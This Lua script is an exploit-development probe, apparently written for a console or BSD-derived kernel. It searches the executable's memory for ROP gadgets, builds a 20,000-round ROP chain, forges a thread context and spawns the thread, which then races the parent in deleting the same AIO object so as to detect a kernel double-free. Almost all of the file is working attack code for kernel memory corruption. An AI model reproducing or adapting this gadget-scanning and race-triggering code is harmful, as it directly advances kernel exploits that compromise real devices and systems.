-- CRASH_CLASS: HIGH
-- PROBE 1047a: double-free detector, now with the poll that makes delete work.
-- 1043a proved a thr_create child can run 20000 native syscalls from its own stack while the
-- parent is inside the Lua path.  If the delete handler takes the object pointer before it
-- takes the entry lock, a child deleting the same id while the parent deletes it must produce
-- TWO successes (two frees of one context).  Each child round writes its own status word, so
-- the count is exact: one 0 is normal, two 0s is a double free.
print("=== PROBE 1047a: aio double-free detector (poll before delete) ===")
local ROUNDS = 20000
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    if type(v) == "table" and v.h then return v.h * 4294967296 + v.l end
    return tonumber(v) or 0
end
local function mk(n) local t = {} for k, v in pairs(syscall.pipe) do t[k] = v end t.syscall_no = n setmetatable(t, getmetatable(syscall.pipe)) return t end
local function rd(a) local o, v = pcall(function() return memory.read_dword(a) end) if o then return to_num(v) end end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function zero(a, n) pcall(function() for i = 0, n - 4, 4 do memory.write_dword(a + i, 0) end end) end

local fn = to_num(syscall.pipe.fn_addr)
local info = memory.alloc(0x200); wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(info)) end)
local ebase = (rd(info + 0x10C) or 0) * 4294967296 + (rd(info + 0x108) or 0)
local function find_pat(base, limit, pat)
    local off = 0
    while off < limit do
        local want = limit - off; if want > 0x1000 then want = 0x1000 end
        local ok, s = pcall(function() return memory.read_buffer(base + off, want) end)
        if not ok or type(s) ~= "string" then return nil end
        local i = string.find(s, pat, 1, true)
        if i then return base + off + i - 1 end
        off = off + want
    end
end
local pop_rax = find_pat(ebase, 0x494000, string.char(0x58, 0xC3))
local pop_rdi = find_pat(ebase, 0x494000, string.char(0x5F, 0xC3))
local pop_rsi = find_pat(ebase, 0x494000, string.char(0x5E, 0xC3))
local pop_rdx = find_pat(ebase, 0x494000, string.char(0x5A, 0xC3))
local store   = find_pat(ebase, 0x494000, string.char(0x48, 0x89, 0x07, 0xC3))
local jmp_g   = find_pat(ebase, 0x494000, string.char(0xEB, 0xFE))
print(string.format("[0] pid=%d eboot=%08X g=%s/%s/%s/%s/%s/%s", to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20)),
    ebase, tostring(pop_rax), tostring(pop_rdi), tostring(pop_rsi), tostring(pop_rdx), tostring(store), tostring(jmp_g)))
if not (pop_rax and pop_rdi and pop_rsi and pop_rdx and store and jmp_g) then print("[!] gadget missing"); return end

local function mmap(px)
    local _, a = pcall(function() return mk(477)(uint64(0), uint64(px), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
    local v = to_num(a)   -- fresh anonymous pages are zero-filled; every chain/status word is written explicitly
    return v
end
local Ctx = { MAGIC = 0x108, TYPE = 0x110, CS = 0x0C0, RIP = 0x0E0, RSP = 0x0F8, SS = 0x100,
              RDI = 0x048, RSI = 0x050, RDX = 0x058, RAX = 0x078 }
local STACK = 0x400000
local block = mmap(STACK)
local D  = mmap(0x4000)
local ID = mmap(0x4000)     -- the id under attack
local ST = mmap(0x40000)    -- 20000 status words
local RES = mmap(0x4000)
print(string.format("[A] block=%08X ID=%08X ST=%08X", block, ID, ST))
if block == 0 or ID == 0 or ST == 0 then print("[!] mmap failed"); return end

-- serial control: create, delete, and prove exactly one success
local sc669, sc662 = mk(669), mk(662)
local function create_into(idp)
    wd(D + 0x00, 0); wd(D + 0x08, 0); wd(D + 0x10, 0); wd(D + 0x18, 0); wd(D + 0x20, -1); wd(D + 0x24, 0)
    wd(idp, 0)
    local ok, rv = pcall(function() return sc669(uint64(0x1001), uint64(D), uint64(1), uint64(1), uint64(idp)) end)
    return ok, to_num(rv), rd(idp) or 0
end
local okc, rvc, id0 = create_into(ID)
print(string.format("[S0] create ok=%s rv=%d id=%d", tostring(okc), rvc, id0))
if id0 == 0 then print("[!] create failed"); return end
wd(ST, 0)
local okd1, rvd1 = pcall(function() return sc662(uint64(ID), uint64(1), uint64(ST)) end)
print(string.format("[S0] serial delete ok=%s st=%08X", tostring(okd1), rd(ST) or 0))
local okc2, rvc2, id1 = create_into(ID)
print(string.format("[S1] recreate ok=%s rv=%d id=%d same_as_first=%s", tostring(okc2), rvc2, id1, tostring(id1 == id0)))
if id1 == 0 then print("[!] recreate failed"); return end
local sc664 = mk(664)
local PO = mmap(0x4000)
wq(PO, uint64(id1)); wd(ST, 0)
local okp0, rvp0 = pcall(function() return sc664(uint64(PO), uint64(1), uint64(ST)) end)
print(string.format("[S1] poll ok=%s st=%08X rv=%d", tostring(okp0), rd(ST) or 0, to_num(rvp0)))

-- child chain: 20000 x 662(ID, 1, ST + i*8), one status word per round
local start = block + 0x4000
local function put(i, v) wq(start + 8 + i * 8, uint64(v)) end
local n = 0
for r = 0, ROUNDS - 1 do
    put(n, pop_rdi); put(n + 1, ID); put(n + 2, pop_rsi); put(n + 3, 1)
    put(n + 4, pop_rdx); put(n + 5, ST + r * 8); put(n + 6, pop_rax); put(n + 7, 662); put(n + 8, fn)
    n = n + 9
end
put(n, pop_rax); put(n + 1, 20); put(n + 2, fn)
put(n + 3, pop_rdi); put(n + 4, RES); put(n + 5, store)
put(n + 6, pop_rdi); put(n + 7, 0); put(n + 8, pop_rax); put(n + 9, 431); put(n + 10, fn); put(n + 11, jmp_g)
local n2 = n + 12
print(string.format("[B] chain words=%d bytes=%d head=%08X", n2, n2 * 8, start))

local ctx = memory.alloc(0x500); zero(ctx, 0x500)
wq(ctx + Ctx.MAGIC, uint64(0x480)); wq(ctx + Ctx.TYPE, uint64(0x10000))
wq(ctx + Ctx.CS, uint64(0x43)); wq(ctx + Ctx.SS, uint64(0x3B))
wq(ctx + Ctx.RIP, uint64(fn)); wq(ctx + Ctx.RSP, uint64(start + 8))
wq(ctx + Ctx.RAX, uint64(662)); wq(ctx + Ctx.RDI, uint64(ID)); wq(ctx + Ctx.RSI, uint64(1)); wq(ctx + Ctx.RDX, uint64(ST))
local tb = memory.alloc(8); wq(tb, uint64(0))
local oksp, rvsp = pcall(function() return mk(430)(uint64(ctx), uint64(tb), uint64(0)) end)
print(string.format("[S2] spawn ok=%s rv=%s", tostring(oksp), tostring(to_num(rvsp))))
if not oksp then print("[!] spawn failed"); return end

-- parent: delete the same id once, right in the middle of the child's sweep
local ts = memory.alloc(16)
wq(ts, 0); wq(ts + 8, 1000000)
pcall(function() mk(240)(uint64(ts), uint64(0)) end)
local P = mmap(0x4000)
wd(P, 0xFFFFFFFF)
local okp, rvp = pcall(function() return sc662(uint64(ID), uint64(1), uint64(P)) end)
local pst = rd(P) or 0
print(string.format("[P] parent delete ok=%s st=%08X rv=%d", tostring(okp), pst, to_num(rvp)))
wq(ts, 0); wq(ts + 8, 300000000)
pcall(function() mk(240)(uint64(ts), uint64(0)) end)

local zeros, nonzero = 0, 0
for r = 0, ROUNDS - 1 do
    local v = rd(ST + r * 8) or 0
    if v == 0 then zeros = zeros + 1 else nonzero = nonzero + 1 end
end
print(string.format("[D] child status words: zero=%d nonzero=%d res=%d", zeros, nonzero, rd(RES) or -1))
if pst == 0 then zeros = zeros + 1 end
print(string.format("[D] total successes=%d (1 = normal, >1 = double free)", zeros))
print("[Z] alive pid=" .. tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20))))
